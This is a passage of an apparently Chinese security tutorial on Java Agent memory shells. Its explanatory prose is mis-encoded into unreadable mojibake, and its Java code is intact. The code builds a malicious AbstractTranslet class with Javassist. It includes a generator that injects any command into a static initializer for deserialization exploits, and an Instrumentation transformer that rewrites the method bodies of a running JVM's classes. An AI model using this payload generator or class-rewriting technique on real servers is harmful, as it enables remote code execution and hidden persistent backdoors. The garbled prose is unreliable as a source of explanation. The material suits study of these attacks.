class="string">&quot;javassist.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªç±»å±æ€§ name</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        <span class="comment">//è®¾ç½®å±æ€§è®¿é—®ç¬¦</span></span><br><span class="line">        ctField1.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">//å°† name å±æ€§æ·»åŠ è¿› Person ä¸­ï¼Œå¹¶è®¾ç½®åˆå§‹å€¼ä¸º Drunkbaby</span></span><br><span class="line">        ctClass.addField(ctField1, CtField.Initializer.constant(<span class="string">&quot;Drunkbaby&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å‘ Person ç±»ä¸­æ·»åŠ  setter å’Œ getter</span></span><br><span class="line">        ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setName&quot;</span>, ctField1));</span><br><span class="line">        ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>, ctField1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªæ— å‚æ„é€ </span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//è®¾ç½®æ–¹æ³•ä½“</span></span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;&#123;name = \&quot;Drunkbaby\&quot;;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//å‘Personç±»ä¸­æ·»åŠ æ— å‚æ„é€ </span></span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸€ä¸ªç±»æ–¹æ³•printName</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType,<span class="string">&quot;printName&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">//è®¾ç½®æ–¹æ³•è®¿é—®ç¬¦</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">//è®¾ç½®æ–¹æ³•ä½“</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(name);&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//å°†è¯¥æ–¹æ³•æ·»åŠ è¿›Personä¸­</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†ç”Ÿæˆçš„å­—èŠ‚ç å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\src\\main\\java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Create_Person();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„ Person.class å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Drunkbaby&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;Drunkbaby&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±æ­¤å»¶å±•çš„æ”»å‡»é¢å…¶å®æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Javassist ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„ <code>.class</code> ç±»ï¼Œå…¶å®åœ¨ CC é“¾çš„æ—¶å€™ä¹Ÿæ˜¯å¯ä»¥è¿™æ ·å­æ‰“çš„ï¼Œä½†æ˜¯æˆ‘å½“æ—¶å¹¶æ²¡æœ‰å­¦ä¹  Javassist çš„æ€è·¯ï¼Œåªæ˜¯é€šè¿‡ Path.get è·å–æ¶æ„ç±»ã€‚</p><h5 id="ä½¿ç”¨-Javassist-ç”Ÿæˆæ¶æ„-class"><a href="#ä½¿ç”¨-Javassist-ç”Ÿæˆæ¶æ„-class" class="headerlink" title="ä½¿ç”¨ Javassist ç”Ÿæˆæ¶æ„ class"></a>ä½¿ç”¨ Javassist ç”Ÿæˆæ¶æ„ class</h5><p>ç”±äºæˆ‘ä»¬çš„æ¶æ„ç±»éœ€è¦ç»§æ‰¿<code>AbstractTranslet</code>ç±»ï¼Œå¹¶é‡å†™ä¸¤ä¸ª<code>transform()</code>æ–¹æ³•ã€‚å¦åˆ™ç¼–è¯‘æ— æ³•é€šè¿‡ï¼Œæ— æ³•ç”Ÿæˆ<code>.class</code>æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¯¥æ¶æ„ç±»åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ç”¨åˆ°é‡å†™çš„æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨Javassistä»å­—èŠ‚ç å±‚é¢æ¥ç”Ÿæˆæ¶æ„classï¼Œè·³è¿‡æ¶æ„ç±»çš„ç¼–è¯‘è¿‡ç¨‹ã€‚ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javassist;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);  </span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  </span><br><span class="line">            ctClass.setSuperclass(superClass);  </span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();  </span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +  </span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);  </span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            ctClass.defrost();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeShell</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">byte</span>[] shell = EvilPayload.getTemplatesImpl(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;S&quot;</span>));  </span><br><span class="line">        fileOutputStream.write(shell);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        writeShell();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„æ¶æ„æ–‡ä»¶è¢«æˆ‘ä»¬è¾“å‡ºåˆ°äº† <code>S</code> è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå…¶å®å¾ˆå¤šååºåˆ—åŒ–åœ¨ç”¨çš„æ—¶å€™ï¼Œæ˜¯æ²¡æœ‰æŠŠè¿™ä¸ªå­—èŠ‚ç æå–ä¿å­˜å‡ºæ¥ï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯å¯ä»¥ä¿å­˜çš„ã€‚</p><p>ä¿å­˜å‡ºæ¥çš„æ–‡ä»¶ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA  </span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var1) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentation æ˜¯ JVMTIAgentï¼ˆJVM Tool Interface Agentï¼‰çš„ä¸€éƒ¨åˆ†ï¼ŒJava agent é€šè¿‡è¿™ä¸ªç±»å’Œç›®æ ‡ JVM è¿›è¡Œäº¤äº’ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹æ•°æ®çš„æ•ˆæœã€‚</p><p>å…¶åœ¨ Java ä¸­æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¸¸ç”¨æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ã€‚</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦è¢«ä¿®æ”¹</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è·å–ç›®æ ‡å·²ç»åŠ è½½çš„ç±»ã€‚</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//è·å–ä¸€ä¸ªå¯¹è±¡çš„å¤§å°</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h5><p>è½¬æ¢ç±»æ–‡ä»¶ï¼Œè¯¥æ¥å£ä¸‹åªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼štransformï¼Œé‡å†™è¯¥æ–¹æ³•å³å¯è½¬æ¢ä»»æ„ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„è¢«å–ä»£çš„ç±»æ–‡ä»¶ï¼Œåœ¨ java agent å†…å­˜é©¬ä¸­ä¾¿æ˜¯åœ¨è¯¥æ–¹æ³•ä¸‹é‡å†™æ¶æ„ä»£ç ï¼Œä»è€Œä¿®æ”¹åŸæœ‰ç±»æ–‡ä»¶ä»£ç é€»è¾‘ï¼Œä¸ addTransformer æ­é…ä½¿ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚  </span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br></pre></td></tr></table></figure><h5 id="è·å–ç›®æ ‡-JVM-å·²åŠ è½½ç±»"><a href="#è·å–ç›®æ ‡-JVM-å·²åŠ è½½ç±»" class="headerlink" title="è·å–ç›®æ ‡ JVM å·²åŠ è½½ç±»"></a>è·å–ç›®æ ‡ JVM å·²åŠ è½½ç±»</h5><p>ä¸‹é¢æˆ‘ä»¬ç®€å•å®ç°ä¸€ä¸ªèƒ½å¤Ÿè·å–ç›®æ ‡ JVM å·²åŠ è½½ç±»çš„ <code>agentmain-Agent</code></p><p>Main æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Sleep</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">            hello();  </span><br><span class="line">            sleep(<span class="number">3000</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Agent ä¸»ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmain_transform</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;  </span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//è·å–ç›®æ ‡JVMåŠ è½½çš„å…¨éƒ¨ç±»  </span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//æ·»åŠ ä¸€ä¸ªtransformeråˆ°Instrumentationï¼Œå¹¶é‡æ–°è§¦å‘ç›®æ ‡ç±»åŠ è½½  </span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Hello_Transform</span>(),<span class="literal">true</span>);  </span><br><span class="line">                inst.retransformClasses(cls);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transformer ä¿®æ”¹ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool            ClassPool classPool = ClassPool.getDefault();  </span></span><br><span class="line">  </span><br><span class="line">            <span class="comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„  </span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);  </span><br><span class="line">                classPool.insertClassPath(ccp);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡ç±»  </span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>);  </span><br><span class="line">            System.out.println(ctClass);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡æ–¹æ³•  </span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//è®¾ç½®æ–¹æ³•ä½“  </span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;  </span><br><span class="line">            ctMethod.setBody(body);  </span><br><span class="line">  </span><br><span class="line">            